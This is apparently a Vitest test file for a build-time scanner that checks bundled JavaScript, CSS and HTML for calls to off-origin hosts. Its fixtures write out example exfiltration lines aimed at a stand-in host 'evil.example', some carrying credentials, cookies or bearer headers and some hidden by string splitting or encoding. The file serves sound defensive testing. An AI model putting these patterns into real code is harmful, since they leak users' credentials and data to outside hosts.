import { describe, expect, it } from 'vitest';

import packageJson from '../package.json';

// The production checker is an executable JavaScript module rather than app code.
// @ts-expect-error No declaration file is needed for this build-time module.
import { decodeObfuscation, emittedViolationsIn, EMITTED_TEXT_EXTENSIONS } from '../scripts/check-no-direct-exposure.mjs';

/**
 * Issue #55, AC2/AC3/AC5.
 *
 * AC2 — the emitted artifact is scanned, not only the source tree.
 * AC3 — credentials, bearer headers, and cookies never attach off-origin.
 * AC5 — coverage for normal imports, dynamic imports, `new URL(..., import.meta.url)`,
 *       CSS URLs, binary/image assets, and obfuscated/encoded URL forms.
 *
 * Only the pure decision is exercised here. The filesystem walk that feeds it is
 * build-time code, and this repository intentionally carries no `@types/node` —
 * the same split as `violationsIn` / `scanDirectExposure` and
 * `privateSiblingLanes` / `privateSiblingArtifacts`.
 */

interface Violation {
  rule: string;
  why: string;
  value: string;
}

const rules = (hits: Violation[]): string[] => hits.map((hit) => hit.rule);
const scan = (text: string, only?: Set<string>): Violation[] =>
  emittedViolationsIn(text, 'assets/index-a1b2c3.js', only ?? null) as Violation[];

describe('emitted artifact is scanned for off-origin destinations (#55 AC2)', () => {
  it('covers every emitted text form the acceptance criterion names', () => {
    // JavaScript, CSS, HTML, JSON, source maps, workers, and manifests.
    for (const ext of ['.js', '.mjs', '.css', '.html', '.json', '.map', '.webmanifest']) {
      expect(EMITTED_TEXT_EXTENSIONS.has(ext), ext).toBe(true);
    }
  });

  it('rejects a loopback destination that survived bundling', () => {
    // Source scanning cannot see this if a dependency introduced it.
    expect(rules(scan('const u="http://127.0.0.1:8791/api";fetch(u)')))
      .toContain('emitted-loopback-host');
  });

  it('rejects credentials embedded in a bundled URL and never reprints them', () => {
    const hits = scan('fetch("https://svc:hunter2@api.example/v1")');
    expect(rules(hits)).toContain('emitted-url-userinfo');
    expect(hits.every((hit) => !hit.value.includes('hunter2'))).toBe(true);
  });

  it('reports the rule, the excerpt, and the reason on every finding', () => {
    const [hit] = scan('fetch("https://evil.example/collect")');
    expect(hit.rule).toContain('off-origin');
    expect(hit.value).toContain('evil.example');
    expect(hit.why).not.toHaveLength(0);
  });

  it('reports one finding per destination, not one per repetition', () => {
    // A minifier repeats the same destination across chunks; a report with
    // hundreds of identical lines is not actionable.
    const repeated = Array.from({ length: 5 }, () => 'fetch("https://evil.example/x")').join(';');
    expect(scan(repeated).filter((hit) => hit.rule.startsWith('emitted-off-origin-dial')))
      .toHaveLength(1);
  });
});

describe('off-origin dial forms (#55 AC5)', () => {
  it('rejects a normal static import of an off-origin module', () => {
    expect(rules(scan('import{a}from"https://cdn.example/pkg.js";')))
      .toContain('emitted-off-origin-module');
  });

  it('rejects a dynamic import of an off-origin module', () => {
    expect(rules(scan('const m=await import("https://cdn.example/late.js")')))
      .toContain('emitted-off-origin-dial');
  });

  it('rejects an off-origin `new URL(..., import.meta.url)` asset reference', () => {
    // Rollup rewrites this form into an emitted local asset. One that still
    // points off-origin was never emitted locally.
    expect(rules(scan('new URL("https://cdn.example/logo.svg",import.meta.url)')))
      .toContain('emitted-off-origin-asset');
  });

  it('rejects an off-origin CSS url()', () => {
    // A third-party font or image load hands every visitor's IP and referrer to
    // that host — a tracking surface the visitor never agreed to.
    expect(rules(scan('@font-face{src:url(https://fonts.example/x.woff2)}')))
      .toContain('emitted-off-origin-css-url');
    expect(rules(scan('.h{background:url("//cdn.example/bg.png")}')))
      .toContain('emitted-off-origin-css-url');
  });

  it('rejects off-origin markup subresources', () => {
    for (const markup of [
      '<script src="https://cdn.example/a.js"></script>',
      '<img srcset="https://cdn.example/a.png 2x">',
      '<form action="https://evil.example/collect">',
      '<link rel="stylesheet" href="https://cdn.example/a.css">',
    ]) {
      expect(rules(scan(markup)), markup).toContain('emitted-off-origin-subresource');
    }
  });

  it('rejects the other browser network sinks', () => {
    for (const sink of [
      'new WebSocket("wss://evil.example/s")',
      'new EventSource("https://evil.example/stream")',
      'navigator.sendBeacon("https://evil.example/t",d)',
      'importScripts("https://evil.example/w.js")',
      'new Worker("https://evil.example/w.js")',
    ]) {
      expect(rules(scan(sink)), sink).toContain('emitted-off-origin-dial');
    }
  });

  it('rejects an off-origin XMLHttpRequest', () => {
    expect(rules(scan('x.open("GET","https://evil.example/v1")')))
      .toContain('emitted-off-origin-xhr');
  });
});

describe('credentials never attach off-origin (#55 AC3)', () => {
  it('names a credentialed off-origin fetch distinctly from a bare one', () => {
    const hits = scan('fetch("https://evil.example/v1",{credentials:"include"})');
    expect(rules(hits)).toContain('emitted-off-origin-dial-credentialed');
    expect(hits.some((hit) => hit.why.includes('credentials'))).toBe(true);
  });

  it('flags a bearer or authorization header sent off-origin', () => {
    expect(rules(scan('fetch("https://evil.example/v1",{headers:{Authorization:"Bearer "+t}})')))
      .toContain('emitted-off-origin-dial-credentialed');
  });

  it('flags a cookie header sent off-origin', () => {
    expect(rules(scan('fetch("https://evil.example/v1",{headers:{Cookie:c}})')))
      .toContain('emitted-off-origin-dial-credentialed');
  });

  it('flags withCredentials on an off-origin XHR, including the minified form', () => {
    expect(rules(scan('x.open("GET","https://evil.example/v1");x.withCredentials=!0')))
      .toContain('emitted-off-origin-xhr-credentialed');
  });

  it('never reprints the credential itself', () => {
    const hits = scan('fetch("https://u:hunter2@evil.example/v1",{credentials:"include"})');
    expect(hits).not.toHaveLength(0);
    expect(hits.every((hit) => !hit.value.includes('hunter2')), JSON.stringify(hits)).toBe(true);
  });

  it('leaves the correct same-origin credentialed call alone', () => {
    // `src/data/api.ts` and `src/ui/gated-upload.ts` do exactly this. Flagging
    // it would make the guard unusable.
    expect(scan('fetch("/api/intake",{credentials:"include"})')).toHaveLength(0);
    expect(scan('fetch("/api/notifications",{credentials:"same-origin"})')).toHaveLength(0);
  });
});

describe('obfuscated and encoded URL forms (#55 AC5)', () => {
  it('decodes escape and concatenation forms back to a readable URL', () => {
    expect(decodeObfuscation('"htt"+"ps://evil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:\\/\\/evil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:\\x2f\\x2fevil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:\\u002f\\u002fevil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:%2f%2fevil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:%252f%252fevil.example"')).toContain('https://evil.example');
  });

  it('leaves a control character encoded rather than splicing the text', () => {
    // Decoding %0a would manufacture a line break that is not in the artifact.
    expect(decodeObfuscation('/api%0aHost:evil')).toContain('%0a');
  });

  it('catches a dial hidden behind each obfuscated form', () => {
    for (const form of [
      'fetch("htt"+"ps://evil.example/x")',
      'fetch("https:\\/\\/evil.example/x")',
      'fetch("https:\\x2f\\x2fevil.example/x")',
      'fetch("https:%2f%2fevil.example/x")',
    ]) {
      expect(rules(scan(form)), form).toContain('emitted-off-origin-dial');
    }
  });

  it('catches an encoded loopback destination', () => {
    expect(rules(scan('const u="http:%2f%2f127.0.0.1:8791/api"')))
      .toContain('emitted-loopback-host');
  });
});

describe('binary and image assets (#55 AC5)', () => {
  const BINARY_ONLY = new Set(['emitted-loopback-host', 'emitted-url-userinfo']);

  it('catches a destination hidden in image or font metadata', () => {
    // A PNG text chunk read as bytes. Only the two never-legitimate shapes are
    // applied, so a byte sequence cannot accidentally look like a dial.
    const png = `\x89PNG\r\n\x1a\ntEXtComment\x00see http://127.0.0.1:8791/api\x00IEND`;
    expect(rules(scan(png, BINARY_ONLY))).toContain('emitted-loopback-host');
  });

  it('does not apply dial rules to binary bytes', () => {
    // `fetch(` appearing inside compressed bytes is noise, not a call site.
    expect(scan('\x00\x01fetch("https://evil.example/x")\x02', BINARY_ONLY)).toHaveLength(0);
  });
});

describe('honest civic data keeps passing (#55)', () => {
  it('does not flag a captured source citation', () => {
    // Fixtures cite real public records and are bundled verbatim. A citation is
    // evidence; only a dial is a destination. Flagging these would fail the
    // build on honest data.
    expect(scan('{"source_url":"https://alpinewy.gov/agenda-2026-04-14.pdf"}')).toHaveLength(0);
    expect(scan('{"archive":"https://web.archive.org/web/2026/https://alpinewy.gov"}'))
      .toHaveLength(0);
  });

  it('does not flag an anchor to a cited public record', () => {
    // `<a href>` is how a citation appears in rendered markup. `<link href>`,
    // `src`, and `action` are loads and stay flagged.
    expect(scan('<a href="https://alpinewy.gov/minutes.pdf" rel="noopener">Minutes</a>'))
      .toHaveLength(0);
  });

  it('does not flag same-origin and data URLs', () => {
    expect(scan('fetch("/api/timeline")')).toHaveLength(0);
    expect(scan('.i{background:url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)}')).toHaveLength(0);
    expect(scan('.i{background:url("/assets/hero-a1b2.png")}')).toHaveLength(0);
    expect(scan('import{render}from"./chunk-a1b2.js"')).toHaveLength(0);
  });
});

describe('where the emitted scan is enforced (#55 AC2)', () => {
  const scripts = packageJson.scripts as Record<string, string>;

  it('audits the private-beta artifact after it is built', () => {
    expect(scripts['build:private-beta']).toContain('--emitted dist/client');
  });

  it('audits the public artifact after it is built', () => {
    expect(scripts['build:public']).toContain('--emitted dist/public');
  });

  it('runs the emitted scan after the bundler, not before it', () => {
    // Ordering is the whole point: scanning before `vite build` would read a
    // stale or absent artifact and pass vacuously.
    const publicLane = scripts['build:public'];
    expect(publicLane.indexOf('vite build')).toBeLessThan(publicLane.indexOf('--emitted'));
  });

  it('offers the emitted scan for each lane as its own entry point', () => {
    expect(scripts['check:emitted']).toContain('--emitted dist/client');
    expect(scripts['check:emitted-public']).toContain('--emitted dist/public');
  });
});
